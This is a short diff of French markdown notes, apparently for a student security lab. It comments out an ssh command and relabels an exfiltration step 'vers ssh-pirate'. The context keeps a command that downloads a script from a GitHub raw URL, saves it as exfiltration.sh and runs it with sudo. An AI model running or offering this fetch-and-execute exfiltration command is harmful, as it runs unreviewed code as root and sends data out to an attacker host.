@@ -202,11 +202,11 @@ echo 'hinataestnul' > pots_de_vinnaruto.xlsx
 ```bash
 cd /home/etudiant && mkdir /home/etudiant/data
 
-ssh $srv_entreprise
+# ssh $srv_entreprise
 ```
 
 
-- serveur entreprise : mise en place du transfert : vers ssh-pirate
+- poste : mise en place du transfert : vers ssh-pirate
 `curl https://raw.githubusercontent.com/amineAUPEC/kajan/main/scp_transf.sh > exfiltration.sh && sudo chmod +x exfiltration.sh && sudo ./exfiltration.sh`
 
 
